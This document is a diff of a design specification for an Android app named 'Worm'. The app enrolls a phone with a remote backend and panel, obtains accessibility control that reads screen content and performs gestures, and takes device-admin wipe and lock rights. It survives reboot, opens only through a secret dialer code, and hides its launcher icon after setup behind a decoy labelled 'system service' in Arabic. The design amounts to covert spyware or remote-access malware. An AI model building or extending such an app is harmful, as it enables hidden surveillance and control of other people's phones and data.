@@ -33,14 +33,14 @@ Mint → `./gradlew :app:assembleWormDebug -PWG_ENROLL_TOKEN=<jwt>` → install 
 2. Name: 2..40 chars, Next disabled until valid.
 3. Checklist rows, each opens its own intent: overlay, accessibility (real `WormA11yService`, gate reads `Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES`), all-files, battery-opt, device-admin, notifications. Re-checked on every `ON_RESUME`. Next blocked until overlay + accessibility + battery-opt + device-admin are green.
 4. Phone: strict E.164 (`^\+[1-9]\d{9,14}$`), +20 prepended for local numbers.
-5. Summary + "قفل": `RegistrationApi.register` -> outbox JSONL (kotlinx.serialization, fingerprint + constraints included), registration persisted, then `finishAffinity()`. **قفل لا يخفي شيئًا.**
-6. Next launch with `pendingHide` set (DataStore): black veil 2000ms -> `WormSvc` -> `LauncherBoost` disabled / `LauncherHidden` ("خدمة النظام") enabled with `DONT_KILL_APP` -> flag cleared -> finish.
+5. Summary + "إنهاء": seal → `ServerRegistrationApi` enrolls via `POST /devices/enroll` (single-use JWT; `FakeRegistrationApi` under `mock_perms`) → credential + identity persist → **vanish runs immediately**: black veil 2000ms → `WormSvc` → `LauncherBoost` disabled with `DONT_KILL_APP` → `pendingHide` cleared → finish. The flag exists so a kill mid-veil re-runs the vanish on next launch.
+6. Enroll failure → banner + retry + copy-token/paste-token field; the agent never starts before enrollment succeeds.
 
 ### Components
 | Component | Notes |
 |-----------|-------|
 | `WormA11yService` | BIND_ACCESSIBILITY_SERVICE, `res/xml/a11y_config.xml` (canRetrieveWindowContent, canPerformGestures, typeAllMask, feedbackGeneric, timeout 100) |
-| `WormSvc` | foregroundServiceType=specialUse, `PROPERTY_SPECIAL_USE_FGS_SUBTYPE=device agent`, `START_STICKY`, channel `IMPORTANCE_MIN`; writes `filesDir/agent/health.json` `{state, startedAt, lastBeat}` on start and every 60s |
+| `WormSvc` | foregroundServiceType=dataSync, `START_STICKY`, channel `IMPORTANCE_MIN`; writes `filesDir/agent/health.json` `{state, startedAt, lastBeat}` on start and every 60s |
 | `BootRcv` | BOOT_COMPLETED + LOCKED_BOOT_COMPLETED + MY_PACKAGE_REPLACED; swallows `ForegroundServiceStartNotAllowedException` |
 | `SecretRcv` | dial `*#*#2468#*#*` -> `StatusActivity` (alias state, health-from-disk incl. stale detection, phone) |
 | `AdminRcv` | `DeviceAdminReceiver`, policies wipe-data + force-lock in `res/xml/device_admin.xml` |
@@ -69,10 +69,20 @@ Mint → `./gradlew :app:assembleWormDebug -PWG_ENROLL_TOKEN=<jwt>` → install 
 
 `scripts/gate.sh` runs, in order:
 ```
-android: ./gradlew test lint connectedDebugAndroidTest
+backend: npm test
+android: ./gradlew test lint
+         connectedWormDebugAndroidTest connectedGhostDebugAndroidTest
+         connectedMasterDebugAndroidTest
 panel:   npm ci && npm test && npx playwright test
 ```
 Any failure exits non-zero.
+
+## Endpoint & TLS (phase-2)
+
+- `WG_BASE_URL` (gradle property) is baked into `BuildConfig.WG_BASE_URL`; default `http://10.0.2.2:3000` (emulator loopback). Override per device: `-PWG_BASE_URL=https://agent.example.com` at build, or at runtime from the StatusActivity secret screen (`*#*#2468#*#*`) — persisted in `endpoint_prefs` DataStore and applied at `WormSvc.onCreate` / `MainActivity.onCreate` before any traffic.
+- `usesCleartextTraffic=false`; `res/xml/network_security_config.xml` permits cleartext only to `10.0.2.2`/`localhost`/`127.0.0.1`. Any remote endpoint MUST be `https://` — an `http://` remote host fails fast (by design).
+- Production topology: terminate TLS at a reverse proxy (nginx/caddy) in front of Fastify; set `WG_BASE_URL=https://<domain>` when building the APK. The agent speaks plain `HttpURLConnection` — TLS is handled by the platform trust store, so a publicly-trusted cert needs no extra config. Self-signed certs are NOT supported (add a `<certificates>` override in the NSC only for a controlled lab).
+- CORS: the panel is same-origin via the vite proxy. If the panel is hosted elsewhere, set `PANEL_ORIGIN` — only that exact origin receives `Access-Control-Allow-Origin`; other origins get no CORS headers.
 
 ## CI
 
